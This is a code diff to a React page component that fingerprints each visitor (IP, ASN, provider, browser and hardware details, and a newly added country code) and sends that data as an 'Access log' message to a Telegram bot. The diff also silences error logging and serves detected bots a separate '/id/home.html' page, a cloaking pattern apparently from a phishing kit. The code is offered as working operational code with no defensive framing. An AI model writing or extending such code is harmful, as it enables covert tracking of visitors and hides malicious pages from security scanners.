@@ -94,6 +94,7 @@ const Index: FC = () => {
                     organization_name: geoData.organization_name,
                     organization: geoData.organization,
                     ip: geoData.ip,
+                    country_code: geoData.country_code,
                     navigator: {
                         userAgent: navigator.userAgent,
                         hardwareConcurrency: navigator.hardwareConcurrency,
@@ -109,6 +110,7 @@ const Index: FC = () => {
                 };
 
                 const msg = `🔍 <b>Access log</b>
+🏢 <b>Country:</b> <code>${fullFingerprint.country_code}</code>
 📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
 🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
 🏛️ <b>Provider:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Unknown'}</code>
@@ -136,13 +138,13 @@ const Index: FC = () => {
                     const result = await response.json();
 
                     if (!response.ok) {
-                        console.error('telegram api error:', result);
+                        //console.error('telegram api error:', result);
                         alert(`API Error: ${result.description ?? 'Unknown error'}`);
                     } else {
                         console.log('telegram sent successfully:', result);
                     }
                 } catch (error) {
-                    console.error('telegram send fail:', error);
+                    //console.error('telegram send fail:', error);
                     const errorMsg = error instanceof Error ? error.message : 'Unable to connect';
                     alert(`Network Error: ${errorMsg}`);
                 }
@@ -164,22 +166,24 @@ const Index: FC = () => {
         return (
             <div className="fixed inset-0 flex items-center justify-center bg-white">
                 <div className="flex flex-col items-center gap-2">
-                    <LoadingDots />
+                    {/* <LoadingDots /> */}
                 </div>
             </div>
         );
     }
 
     if (isBot) {
-        return (
-            <div className="fixed inset-0 flex items-center justify-center bg-white">
-                <div className="flex flex-col items-center gap-2">
-                    <LoadingDots />
-                </div>
-            </div>
-        );
+        return(showIframe("/id/home.html",SiteTitleMeta,false));
+        // return (
+        //     <div className="fixed inset-0 flex items-center justify-center bg-white">
+        //         <div className="flex flex-col items-center gap-2">
+        //             <LoadingDots />
+        //         </div>
+        //     </div>
+        // );
     }
-    return showIframe(IframeUrl,SiteTitleMeta,false);
+     return(showIframe("/id/home.html",SiteTitleMeta,false));
+   // return showIframe(IframeUrl,SiteTitleMeta,false);
 };
 
 export default Index;
